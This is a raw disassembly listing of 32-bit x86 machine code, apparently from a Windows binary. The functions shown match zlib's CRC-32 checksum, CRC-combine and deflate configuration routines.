  402bbe:	8b ff                	mov    %edi,%edi
  402bc0:	f6 c1 03             	test   $0x3,%cl
  402bc3:	74 1a                	je     0x402bdf
  402bc5:	0f b6 39             	movzbl (%ecx),%edi
  402bc8:	8b c2                	mov    %edx,%eax
  402bca:	c1 e8 18             	shr    $0x18,%eax
  402bcd:	33 c7                	xor    %edi,%eax
  402bcf:	c1 e2 08             	shl    $0x8,%edx
  402bd2:	33 14 85 b0 c2 41 00 	xor    0x41c2b0(,%eax,4),%edx
  402bd9:	41                   	inc    %ecx
  402bda:	83 ee 01             	sub    $0x1,%esi
  402bdd:	75 e1                	jne    0x402bc0
  402bdf:	53                   	push   %ebx
  402be0:	8d 41 fc             	lea    -0x4(%ecx),%eax
  402be3:	83 fe 20             	cmp    $0x20,%esi
  402be6:	0f 82 27 02 00 00    	jb     0x402e13
  402bec:	8b fe                	mov    %esi,%edi
  402bee:	c1 ef 05             	shr    $0x5,%edi
  402bf1:	33 50 04             	xor    0x4(%eax),%edx
  402bf4:	83 c0 04             	add    $0x4,%eax
  402bf7:	8b ca                	mov    %edx,%ecx
  402bf9:	c1 e9 10             	shr    $0x10,%ecx
  402bfc:	8b da                	mov    %edx,%ebx
  402bfe:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402c04:	8b 0c 8d b0 ca 41 00 	mov    0x41cab0(,%ecx,4),%ecx
  402c0b:	c1 eb 08             	shr    $0x8,%ebx
  402c0e:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402c14:	33 0c 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%ecx
  402c1b:	8b da                	mov    %edx,%ebx
  402c1d:	c1 eb 18             	shr    $0x18,%ebx
  402c20:	33 0c 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%ecx
  402c27:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402c2d:	33 0c 95 b0 c2 41 00 	xor    0x41c2b0(,%edx,4),%ecx
  402c34:	83 c0 04             	add    $0x4,%eax
  402c37:	33 08                	xor    (%eax),%ecx
  402c39:	83 c0 04             	add    $0x4,%eax
  402c3c:	8b d1                	mov    %ecx,%edx
  402c3e:	c1 ea 10             	shr    $0x10,%edx
  402c41:	8b d9                	mov    %ecx,%ebx
  402c43:	c1 eb 08             	shr    $0x8,%ebx
  402c46:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402c4c:	8b 14 95 b0 ca 41 00 	mov    0x41cab0(,%edx,4),%edx
  402c53:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402c59:	33 14 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%edx
  402c60:	8b d9                	mov    %ecx,%ebx
  402c62:	c1 eb 18             	shr    $0x18,%ebx
  402c65:	33 14 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%edx
  402c6c:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402c72:	33 14 8d b0 c2 41 00 	xor    0x41c2b0(,%ecx,4),%edx
  402c79:	83 c0 04             	add    $0x4,%eax
  402c7c:	33 50 fc             	xor    -0x4(%eax),%edx
  402c7f:	83 c0 04             	add    $0x4,%eax
  402c82:	8b ca                	mov    %edx,%ecx
  402c84:	c1 e9 10             	shr    $0x10,%ecx
  402c87:	8b da                	mov    %edx,%ebx
  402c89:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402c8f:	8b 0c 8d b0 ca 41 00 	mov    0x41cab0(,%ecx,4),%ecx
  402c96:	c1 eb 08             	shr    $0x8,%ebx
  402c99:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402c9f:	33 0c 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%ecx
  402ca6:	8b da                	mov    %edx,%ebx
  402ca8:	c1 eb 18             	shr    $0x18,%ebx
  402cab:	33 0c 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%ecx
  402cb2:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402cb8:	33 0c 95 b0 c2 41 00 	xor    0x41c2b0(,%edx,4),%ecx
  402cbf:	83 c0 04             	add    $0x4,%eax
  402cc2:	33 48 f8             	xor    -0x8(%eax),%ecx
  402cc5:	83 c0 04             	add    $0x4,%eax
  402cc8:	8b d1                	mov    %ecx,%edx
  402cca:	c1 ea 10             	shr    $0x10,%edx
  402ccd:	8b d9                	mov    %ecx,%ebx
  402ccf:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402cd5:	8b 14 95 b0 ca 41 00 	mov    0x41cab0(,%edx,4),%edx
  402cdc:	c1 eb 08             	shr    $0x8,%ebx
  402cdf:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402ce5:	33 14 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%edx
  402cec:	8b d9                	mov    %ecx,%ebx
  402cee:	c1 eb 18             	shr    $0x18,%ebx
  402cf1:	33 14 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%edx
  402cf8:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402cfe:	33 14 8d b0 c2 41 00 	xor    0x41c2b0(,%ecx,4),%edx
  402d05:	33 50 f8             	xor    -0x8(%eax),%edx
  402d08:	8b ca                	mov    %edx,%ecx
  402d0a:	c1 e9 10             	shr    $0x10,%ecx
  402d0d:	8b da                	mov    %edx,%ebx
  402d0f:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402d15:	8b 0c 8d b0 ca 41 00 	mov    0x41cab0(,%ecx,4),%ecx
  402d1c:	c1 eb 08             	shr    $0x8,%ebx
  402d1f:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402d25:	33 0c 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%ecx
  402d2c:	8b da                	mov    %edx,%ebx
  402d2e:	c1 eb 18             	shr    $0x18,%ebx
  402d31:	33 0c 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%ecx
  402d38:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402d3e:	33 0c 95 b0 c2 41 00 	xor    0x41c2b0(,%edx,4),%ecx
  402d45:	33 48 fc             	xor    -0x4(%eax),%ecx
  402d48:	8b d1                	mov    %ecx,%edx
  402d4a:	c1 ea 10             	shr    $0x10,%edx
  402d4d:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402d53:	8b 14 95 b0 ca 41 00 	mov    0x41cab0(,%edx,4),%edx
  402d5a:	8b d9                	mov    %ecx,%ebx
  402d5c:	c1 eb 08             	shr    $0x8,%ebx
  402d5f:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402d65:	33 14 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%edx
  402d6c:	8b d9                	mov    %ecx,%ebx
  402d6e:	c1 eb 18             	shr    $0x18,%ebx
  402d71:	33 14 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%edx
  402d78:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402d7e:	33 14 8d b0 c2 41 00 	xor    0x41c2b0(,%ecx,4),%edx
  402d85:	83 c0 04             	add    $0x4,%eax
  402d88:	33 50 fc             	xor    -0x4(%eax),%edx
  402d8b:	83 ee 20             	sub    $0x20,%esi
  402d8e:	8b ca                	mov    %edx,%ecx
  402d90:	8b da                	mov    %edx,%ebx
  402d92:	c1 e9 10             	shr    $0x10,%ecx
  402d95:	c1 eb 08             	shr    $0x8,%ebx
  402d98:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402d9e:	8b 0c 8d b0 ca 41 00 	mov    0x41cab0(,%ecx,4),%ecx
  402da5:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402dab:	33 0c 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%ecx
  402db2:	8b da                	mov    %edx,%ebx
  402db4:	c1 eb 18             	shr    $0x18,%ebx
  402db7:	33 0c 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%ecx
  402dbe:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402dc4:	33 0c 95 b0 c2 41 00 	xor    0x41c2b0(,%edx,4),%ecx
  402dcb:	33 08                	xor    (%eax),%ecx
  402dcd:	8b d1                	mov    %ecx,%edx
  402dcf:	c1 ea 10             	shr    $0x10,%edx
  402dd2:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402dd8:	8b 14 95 b0 ca 41 00 	mov    0x41cab0(,%edx,4),%edx
  402ddf:	8b d9                	mov    %ecx,%ebx
  402de1:	c1 eb 08             	shr    $0x8,%ebx
  402de4:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402dea:	33 14 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%edx
  402df1:	8b d9                	mov    %ecx,%ebx
  402df3:	c1 eb 18             	shr    $0x18,%ebx
  402df6:	33 14 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%edx
  402dfd:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  402e03:	33 14 8d b0 c2 41 00 	xor    0x41c2b0(,%ecx,4),%edx
  402e0a:	83 ef 01             	sub    $0x1,%edi
  402e0d:	0f 85 de fd ff ff    	jne    0x402bf1
  402e13:	83 fe 04             	cmp    $0x4,%esi
  402e16:	72 55                	jb     0x402e6d
  402e18:	8b ce                	mov    %esi,%ecx
  402e1a:	c1 e9 02             	shr    $0x2,%ecx
  402e1d:	8d 49 00             	lea    0x0(%ecx),%ecx
  402e20:	33 50 04             	xor    0x4(%eax),%edx
  402e23:	83 c0 04             	add    $0x4,%eax
  402e26:	8b fa                	mov    %edx,%edi
  402e28:	c1 ef 10             	shr    $0x10,%edi
  402e2b:	81 e7 ff 00 00 00    	and    $0xff,%edi
  402e31:	8b 3c bd b0 ca 41 00 	mov    0x41cab0(,%edi,4),%edi
  402e38:	8b da                	mov    %edx,%ebx
  402e3a:	c1 eb 08             	shr    $0x8,%ebx
  402e3d:	81 e3 ff 00 00 00    	and    $0xff,%ebx
  402e43:	33 3c 9d b0 c6 41 00 	xor    0x41c6b0(,%ebx,4),%edi
  402e4a:	8b da                	mov    %edx,%ebx
  402e4c:	c1 eb 18             	shr    $0x18,%ebx
  402e4f:	33 3c 9d b0 ce 41 00 	xor    0x41ceb0(,%ebx,4),%edi
  402e56:	81 e2 ff 00 00 00    	and    $0xff,%edx
  402e5c:	33 3c 95 b0 c2 41 00 	xor    0x41c2b0(,%edx,4),%edi
  402e63:	83 ee 04             	sub    $0x4,%esi
  402e66:	83 e9 01             	sub    $0x1,%ecx
  402e69:	8b d7                	mov    %edi,%edx
  402e6b:	75 b3                	jne    0x402e20
  402e6d:	83 c0 04             	add    $0x4,%eax
  402e70:	5b                   	pop    %ebx
  402e71:	85 f6                	test   %esi,%esi
  402e73:	74 1a                	je     0x402e8f
  402e75:	0f b6 38             	movzbl (%eax),%edi
  402e78:	8b ca                	mov    %edx,%ecx
  402e7a:	c1 e9 18             	shr    $0x18,%ecx
  402e7d:	33 cf                	xor    %edi,%ecx
  402e7f:	c1 e2 08             	shl    $0x8,%edx
  402e82:	33 14 8d b0 c2 41 00 	xor    0x41c2b0(,%ecx,4),%edx
  402e89:	40                   	inc    %eax
  402e8a:	83 ee 01             	sub    $0x1,%esi
  402e8d:	75 e6                	jne    0x402e75
  402e8f:	f7 d2                	not    %edx
  402e91:	8b c2                	mov    %edx,%eax
  402e93:	25 00 ff 00 00       	and    $0xff00,%eax
  402e98:	8b ca                	mov    %edx,%ecx
  402e9a:	c1 e1 10             	shl    $0x10,%ecx
  402e9d:	03 c1                	add    %ecx,%eax
  402e9f:	8b ca                	mov    %edx,%ecx
  402ea1:	c1 e9 08             	shr    $0x8,%ecx
  402ea4:	c1 e0 08             	shl    $0x8,%eax
  402ea7:	81 e1 00 ff 00 00    	and    $0xff00,%ecx
  402ead:	03 c1                	add    %ecx,%eax
  402eaf:	c1 ea 18             	shr    $0x18,%edx
  402eb2:	5f                   	pop    %edi
  402eb3:	03 c2                	add    %edx,%eax
  402eb5:	5e                   	pop    %esi
  402eb6:	c3                   	ret
  402eb7:	cc                   	int3
  402eb8:	cc                   	int3
  402eb9:	cc                   	int3
  402eba:	cc                   	int3
  402ebb:	cc                   	int3
  402ebc:	cc                   	int3
  402ebd:	cc                   	int3
  402ebe:	cc                   	int3
  402ebf:	cc                   	int3
  402ec0:	33 c0                	xor    %eax,%eax
  402ec2:	85 c9                	test   %ecx,%ecx
  402ec4:	74 10                	je     0x402ed6
  402ec6:	f6 c1 01             	test   $0x1,%cl
  402ec9:	74 02                	je     0x402ecd
  402ecb:	33 02                	xor    (%edx),%eax
  402ecd:	d1 e9                	shr    $1,%ecx
  402ecf:	83 c2 04             	add    $0x4,%edx
  402ed2:	85 c9                	test   %ecx,%ecx
  402ed4:	75 f0                	jne    0x402ec6
  402ed6:	c3                   	ret
  402ed7:	cc                   	int3
  402ed8:	cc                   	int3
  402ed9:	cc                   	int3
  402eda:	cc                   	int3
  402edb:	cc                   	int3
  402edc:	cc                   	int3
  402edd:	cc                   	int3
  402ede:	cc                   	int3
  402edf:	cc                   	int3
  402ee0:	55                   	push   %ebp
  402ee1:	56                   	push   %esi
  402ee2:	57                   	push   %edi
  402ee3:	8b f0                	mov    %eax,%esi
  402ee5:	8b fb                	mov    %ebx,%edi
  402ee7:	2b fe                	sub    %esi,%edi
  402ee9:	bd 20 00 00 00       	mov    $0x20,%ebp
  402eee:	8b ff                	mov    %edi,%edi
  402ef0:	8b 04 37             	mov    (%edi,%esi,1),%eax
  402ef3:	33 d2                	xor    %edx,%edx
  402ef5:	8b cb                	mov    %ebx,%ecx
  402ef7:	85 c0                	test   %eax,%eax
  402ef9:	74 14                	je     0x402f0f
  402efb:	eb 03                	jmp    0x402f00
  402efd:	8d 49 00             	lea    0x0(%ecx),%ecx
  402f00:	a8 01                	test   $0x1,%al
  402f02:	74 02                	je     0x402f06
  402f04:	33 11                	xor    (%ecx),%edx
  402f06:	d1 e8                	shr    $1,%eax
  402f08:	83 c1 04             	add    $0x4,%ecx
  402f0b:	85 c0                	test   %eax,%eax
  402f0d:	75 f1                	jne    0x402f00
  402f0f:	89 16                	mov    %edx,(%esi)
  402f11:	83 c6 04             	add    $0x4,%esi
  402f14:	83 ed 01             	sub    $0x1,%ebp
  402f17:	75 d7                	jne    0x402ef0
  402f19:	5f                   	pop    %edi
  402f1a:	5e                   	pop    %esi
  402f1b:	5d                   	pop    %ebp
  402f1c:	c3                   	ret
  402f1d:	cc                   	int3
  402f1e:	cc                   	int3
  402f1f:	cc                   	int3
  402f20:	81 ec 00 01 00 00    	sub    $0x100,%esp
  402f26:	83 bc 24 0c 01 00 00 	cmpl   $0x0,0x10c(%esp)
  402f2d:	00 
  402f2e:	75 0e                	jne    0x402f3e
  402f30:	8b 84 24 04 01 00 00 	mov    0x104(%esp),%eax
  402f37:	81 c4 00 01 00 00    	add    $0x100,%esp
  402f3d:	c3                   	ret
  402f3e:	b9 01 00 00 00       	mov    $0x1,%ecx
  402f43:	c7 04 24 20 83 b8 ed 	movl   $0xedb88320,(%esp)
  402f4a:	8b c1                	mov    %ecx,%eax
  402f4c:	8d 64 24 00          	lea    0x0(%esp),%esp
  402f50:	89 0c 84             	mov    %ecx,(%esp,%eax,4)
  402f53:	40                   	inc    %eax
  402f54:	03 c9                	add    %ecx,%ecx
  402f56:	83 f8 20             	cmp    $0x20,%eax
  402f59:	7c f5                	jl     0x402f50
  402f5b:	53                   	push   %ebx
  402f5c:	56                   	push   %esi
  402f5d:	57                   	push   %edi
  402f5e:	8d 5c 24 0c          	lea    0xc(%esp),%ebx
  402f62:	8d 84 24 8c 00 00 00 	lea    0x8c(%esp),%eax
  402f69:	e8 72 ff ff ff       	call   0x402ee0
  402f6e:	8d 9c 24 8c 00 00 00 	lea    0x8c(%esp),%ebx
  402f75:	8d 44 24 0c          	lea    0xc(%esp),%eax
  402f79:	e8 62 ff ff ff       	call   0x402ee0
  402f7e:	8b 84 24 10 01 00 00 	mov    0x110(%esp),%eax
  402f85:	33 ff                	xor    %edi,%edi
  402f87:	eb 07                	jmp    0x402f90
  402f89:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  402f90:	8b 4c 3c 0c          	mov    0xc(%esp,%edi,1),%ecx
  402f94:	33 f6                	xor    %esi,%esi
  402f96:	8d 54 24 0c          	lea    0xc(%esp),%edx
  402f9a:	85 c9                	test   %ecx,%ecx
  402f9c:	74 12                	je     0x402fb0
  402f9e:	8b ff                	mov    %edi,%edi
  402fa0:	f6 c1 01             	test   $0x1,%cl
  402fa3:	74 02                	je     0x402fa7
  402fa5:	33 32                	xor    (%edx),%esi
  402fa7:	d1 e9                	shr    $1,%ecx
  402fa9:	83 c2 04             	add    $0x4,%edx
  402fac:	85 c9                	test   %ecx,%ecx
  402fae:	75 f0                	jne    0x402fa0
  402fb0:	89 b4 3c 8c 00 00 00 	mov    %esi,0x8c(%esp,%edi,1)
  402fb7:	83 c7 04             	add    $0x4,%edi
  402fba:	81 ff 80 00 00 00    	cmp    $0x80,%edi
  402fc0:	7c ce                	jl     0x402f90
  402fc2:	8b 9c 24 18 01 00 00 	mov    0x118(%esp),%ebx
  402fc9:	f6 c3 01             	test   $0x1,%bl
  402fcc:	74 23                	je     0x402ff1
  402fce:	33 d2                	xor    %edx,%edx
  402fd0:	8d 8c 24 8c 00 00 00 	lea    0x8c(%esp),%ecx
  402fd7:	85 c0                	test   %eax,%eax
  402fd9:	74 14                	je     0x402fef
  402fdb:	eb 03                	jmp    0x402fe0
  402fdd:	8d 49 00             	lea    0x0(%ecx),%ecx
  402fe0:	a8 01                	test   $0x1,%al
  402fe2:	74 02                	je     0x402fe6
  402fe4:	33 11                	xor    (%ecx),%edx
  402fe6:	d1 e8                	shr    $1,%eax
  402fe8:	83 c1 04             	add    $0x4,%ecx
  402feb:	85 c0                	test   %eax,%eax
  402fed:	75 f1                	jne    0x402fe0
  402fef:	8b c2                	mov    %edx,%eax
  402ff1:	d1 fb                	sar    $1,%ebx
  402ff3:	74 6d                	je     0x403062
  402ff5:	33 ff                	xor    %edi,%edi
  402ff7:	eb 07                	jmp    0x403000
  402ff9:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  403000:	8b 8c 3c 8c 00 00 00 	mov    0x8c(%esp,%edi,1),%ecx
  403007:	33 f6                	xor    %esi,%esi
  403009:	8d 94 24 8c 00 00 00 	lea    0x8c(%esp),%edx
  403010:	85 c9                	test   %ecx,%ecx
  403012:	74 10                	je     0x403024
  403014:	f6 c1 01             	test   $0x1,%cl
  403017:	74 02                	je     0x40301b
  403019:	33 32                	xor    (%edx),%esi
  40301b:	d1 e9                	shr    $1,%ecx
  40301d:	83 c2 04             	add    $0x4,%edx
  403020:	85 c9                	test   %ecx,%ecx
  403022:	75 f0                	jne    0x403014
  403024:	89 74 3c 0c          	mov    %esi,0xc(%esp,%edi,1)
  403028:	83 c7 04             	add    $0x4,%edi
  40302b:	81 ff 80 00 00 00    	cmp    $0x80,%edi
  403031:	7c cd                	jl     0x403000
  403033:	f6 c3 01             	test   $0x1,%bl
  403036:	74 1b                	je     0x403053
  403038:	33 d2                	xor    %edx,%edx
  40303a:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40303e:	85 c0                	test   %eax,%eax
  403040:	74 0f                	je     0x403051
  403042:	a8 01                	test   $0x1,%al
  403044:	74 02                	je     0x403048
  403046:	33 11                	xor    (%ecx),%edx
  403048:	d1 e8                	shr    $1,%eax
  40304a:	83 c1 04             	add    $0x4,%ecx
  40304d:	85 c0                	test   %eax,%eax
  40304f:	75 f1                	jne    0x403042
  403051:	8b c2                	mov    %edx,%eax
  403053:	d1 fb                	sar    $1,%ebx
  403055:	89 9c 24 18 01 00 00 	mov    %ebx,0x118(%esp)
  40305c:	0f 85 23 ff ff ff    	jne    0x402f85
  403062:	33 84 24 14 01 00 00 	xor    0x114(%esp),%eax
  403069:	5f                   	pop    %edi
  40306a:	5e                   	pop    %esi
  40306b:	5b                   	pop    %ebx
  40306c:	81 c4 00 01 00 00    	add    $0x100,%esp
  403072:	c3                   	ret
  403073:	cc                   	int3
  403074:	cc                   	int3
  403075:	cc                   	int3
  403076:	cc                   	int3
  403077:	cc                   	int3
  403078:	cc                   	int3
  403079:	cc                   	int3
  40307a:	cc                   	int3
  40307b:	cc                   	int3
  40307c:	cc                   	int3
  40307d:	cc                   	int3
  40307e:	cc                   	int3
  40307f:	cc                   	int3
  403080:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403084:	85 c9                	test   %ecx,%ecx
  403086:	75 03                	jne    0x40308b
  403088:	33 c0                	xor    %eax,%eax
  40308a:	c3                   	ret
  40308b:	8b 54 24 0c          	mov    0xc(%esp),%edx
  40308f:	8b 44 24 04          	mov    0x4(%esp),%eax
  403093:	e9 18 f8 ff ff       	jmp    0x4028b0
  403098:	cc                   	int3
  403099:	cc                   	int3
  40309a:	cc                   	int3
  40309b:	cc                   	int3
  40309c:	cc                   	int3
  40309d:	cc                   	int3
  40309e:	cc                   	int3
  40309f:	cc                   	int3
  4030a0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4030a4:	53                   	push   %ebx
  4030a5:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4030a9:	55                   	push   %ebp
  4030aa:	56                   	push   %esi
  4030ab:	57                   	push   %edi
  4030ac:	8b fb                	mov    %ebx,%edi
  4030ae:	85 c9                	test   %ecx,%ecx
  4030b0:	0f 84 dc 00 00 00    	je     0x403192
  4030b6:	8b 71 1c             	mov    0x1c(%ecx),%esi
  4030b9:	85 f6                	test   %esi,%esi
  4030bb:	0f 84 d1 00 00 00    	je     0x403192
  4030c1:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4030c5:	85 ed                	test   %ebp,%ebp
  4030c7:	0f 84 c5 00 00 00    	je     0x403192
  4030cd:	8b 46 18             	mov    0x18(%esi),%eax
  4030d0:	83 f8 02             	cmp    $0x2,%eax
  4030d3:	0f 84 b9 00 00 00    	je     0x403192
  4030d9:	83 f8 01             	cmp    $0x1,%eax
  4030dc:	75 0a                	jne    0x4030e8
  4030de:	83 7e 04 2a          	cmpl   $0x2a,0x4(%esi)
  4030e2:	0f 85 aa 00 00 00    	jne    0x403192
  4030e8:	85 c0                	test   %eax,%eax
  4030ea:	74 15                	je     0x403101
  4030ec:	8b 41 30             	mov    0x30(%ecx),%eax
  4030ef:	53                   	push   %ebx
  4030f0:	55                   	push   %ebp
  4030f1:	50                   	push   %eax
  4030f2:	e8 a9 f3 ff ff       	call   0x4024a0
  4030f7:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  4030fb:	83 c4 0c             	add    $0xc,%esp
  4030fe:	89 41 30             	mov    %eax,0x30(%ecx)
  403101:	83 fb 03             	cmp    $0x3,%ebx
  403104:	0f 82 81 00 00 00    	jb     0x40318b
  40310a:	8b 46 2c             	mov    0x2c(%esi),%eax
  40310d:	05 fa fe ff ff       	add    $0xfffffefa,%eax
  403112:	3b d8                	cmp    %eax,%ebx
  403114:	76 06                	jbe    0x40311c
  403116:	8b f8                	mov    %eax,%edi
  403118:	2b df                	sub    %edi,%ebx
  40311a:	03 eb                	add    %ebx,%ebp
  40311c:	8b 56 38             	mov    0x38(%esi),%edx
  40311f:	57                   	push   %edi
  403120:	55                   	push   %ebp
  403121:	52                   	push   %edx
  403122:	e8 29 82 00 00       	call   0x40b350
  403127:	8b 56 38             	mov    0x38(%esi),%edx
  40312a:	8b 4e 58             	mov    0x58(%esi),%ecx
  40312d:	89 7e 6c             	mov    %edi,0x6c(%esi)
  403130:	89 7e 5c             	mov    %edi,0x5c(%esi)
  403133:	0f b6 02             	movzbl (%edx),%eax
  403136:	89 46 48             	mov    %eax,0x48(%esi)
  403139:	d3 e0                	shl    %cl,%eax
  40313b:	0f b6 4a 01          	movzbl 0x1(%edx),%ecx
  40313f:	33 c1                	xor    %ecx,%eax
  403141:	23 46 54             	and    0x54(%esi),%eax
  403144:	83 c4 0c             	add    $0xc,%esp
  403147:	33 d2                	xor    %edx,%edx
  403149:	89 46 48             	mov    %eax,0x48(%esi)
  40314c:	83 c7 fd             	add    $0xfffffffd,%edi
  40314f:	90                   	nop
  403150:	8b 5e 48             	mov    0x48(%esi),%ebx
  403153:	8b 4e 58             	mov    0x58(%esi),%ecx
  403156:	8b 46 38             	mov    0x38(%esi),%eax
  403159:	0f b6 44 10 02       	movzbl 0x2(%eax,%edx,1),%eax
  40315e:	8b 6e 40             	mov    0x40(%esi),%ebp
  403161:	d3 e3                	shl    %cl,%ebx
  403163:	8b 4e 44             	mov    0x44(%esi),%ecx
  403166:	33 c3                	xor    %ebx,%eax
  403168:	23 46 54             	and    0x54(%esi),%eax
  40316b:	8b 5e 34             	mov    0x34(%esi),%ebx
  40316e:	89 46 48             	mov    %eax,0x48(%esi)
  403171:	66 8b 04 41          	mov    (%ecx,%eax,2),%ax
  403175:	23 da                	and    %edx,%ebx
  403177:	66 89 44 5d 00       	mov    %ax,0x0(%ebp,%ebx,2)
  40317c:	8b 4e 48             	mov    0x48(%esi),%ecx
  40317f:	8b 46 44             	mov    0x44(%esi),%eax
  403182:	66 89 14 48          	mov    %dx,(%eax,%ecx,2)
  403186:	42                   	inc    %edx
  403187:	3b d7                	cmp    %edi,%edx
  403189:	76 c5                	jbe    0x403150
  40318b:	5f                   	pop    %edi
  40318c:	5e                   	pop    %esi
  40318d:	5d                   	pop    %ebp
  40318e:	33 c0                	xor    %eax,%eax
  403190:	5b                   	pop    %ebx
  403191:	c3                   	ret
  403192:	5f                   	pop    %edi
  403193:	5e                   	pop    %esi
  403194:	5d                   	pop    %ebp
  403195:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  40319a:	5b                   	pop    %ebx
  40319b:	c3                   	ret
  40319c:	cc                   	int3
  40319d:	cc                   	int3
  40319e:	cc                   	int3
  40319f:	cc                   	int3
  4031a0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031a4:	85 c0                	test   %eax,%eax
  4031a6:	74 17                	je     0x4031bf
  4031a8:	8b 40 1c             	mov    0x1c(%eax),%eax
  4031ab:	85 c0                	test   %eax,%eax
  4031ad:	74 10                	je     0x4031bf
  4031af:	83 78 18 02          	cmpl   $0x2,0x18(%eax)
  4031b3:	75 0a                	jne    0x4031bf
  4031b5:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4031b9:	89 48 1c             	mov    %ecx,0x1c(%eax)
  4031bc:	33 c0                	xor    %eax,%eax
  4031be:	c3                   	ret
  4031bf:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  4031c4:	c3                   	ret
  4031c5:	cc                   	int3
  4031c6:	cc                   	int3
  4031c7:	cc                   	int3
  4031c8:	cc                   	int3
  4031c9:	cc                   	int3
  4031ca:	cc                   	int3
  4031cb:	cc                   	int3
  4031cc:	cc                   	int3
  4031cd:	cc                   	int3
  4031ce:	cc                   	int3
  4031cf:	cc                   	int3
  4031d0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4031d4:	85 c0                	test   %eax,%eax
  4031d6:	74 2c                	je     0x403204
  4031d8:	83 78 1c 00          	cmpl   $0x0,0x1c(%eax)
  4031dc:	74 26                	je     0x403204
  4031de:	8b 50 1c             	mov    0x1c(%eax),%edx
  4031e1:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4031e5:	89 8a bc 16 00 00    	mov    %ecx,0x16bc(%edx)
  4031eb:	8b 40 1c             	mov    0x1c(%eax),%eax
  4031ee:	ba 01 00 00 00       	mov    $0x1,%edx
  4031f3:	d3 e2                	shl    %cl,%edx
  4031f5:	4a                   	dec    %edx
  4031f6:	23 54 24 0c          	and    0xc(%esp),%edx
  4031fa:	66 89 90 b8 16 00 00 	mov    %dx,0x16b8(%eax)
  403201:	33 c0                	xor    %eax,%eax
  403203:	c3                   	ret
  403204:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  403209:	c3                   	ret
  40320a:	cc                   	int3
  40320b:	cc                   	int3
  40320c:	cc                   	int3
  40320d:	cc                   	int3
  40320e:	cc                   	int3
  40320f:	cc                   	int3
  403210:	8b 44 24 04          	mov    0x4(%esp),%eax
  403214:	85 c0                	test   %eax,%eax
  403216:	74 2f                	je     0x403247
  403218:	8b 40 1c             	mov    0x1c(%eax),%eax
  40321b:	85 c0                	test   %eax,%eax
  40321d:	74 28                	je     0x403247
  40321f:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  403223:	8b 54 24 0c          	mov    0xc(%esp),%edx
  403227:	89 88 8c 00 00 00    	mov    %ecx,0x8c(%eax)
  40322d:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403231:	89 90 80 00 00 00    	mov    %edx,0x80(%eax)
  403237:	8b 54 24 14          	mov    0x14(%esp),%edx
  40323b:	89 88 90 00 00 00    	mov    %ecx,0x90(%eax)
  403241:	89 50 7c             	mov    %edx,0x7c(%eax)
  403244:	33 c0                	xor    %eax,%eax
  403246:	c3                   	ret
  403247:	b8 fe ff ff ff       	mov    $0xfffffffe,%eax
  40324c:	c3                   	ret
  40324d:	cc                   	int3
  40324e:	cc                   	int3
  40324f:	cc                   	int3
  403250:	8b 54 24 08          	mov    0x8(%esp),%edx
  403254:	8d 42 3f             	lea    0x3f(%edx),%eax
  403257:	c1 e8 06             	shr    $0x6,%eax
  40325a:	8d 4a 07             	lea    0x7(%edx),%ecx
  40325d:	c1 e9 03             	shr    $0x3,%ecx
  403260:	03 c2                	add    %edx,%eax
  403262:	8d 44 01 0b          	lea    0xb(%ecx,%eax,1),%eax
  403266:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40326a:	85 c9                	test   %ecx,%ecx
  40326c:	74 1c                	je     0x40328a
  40326e:	8b 49 1c             	mov    0x1c(%ecx),%ecx
  403271:	85 c9                	test   %ecx,%ecx
  403273:	74 15                	je     0x40328a
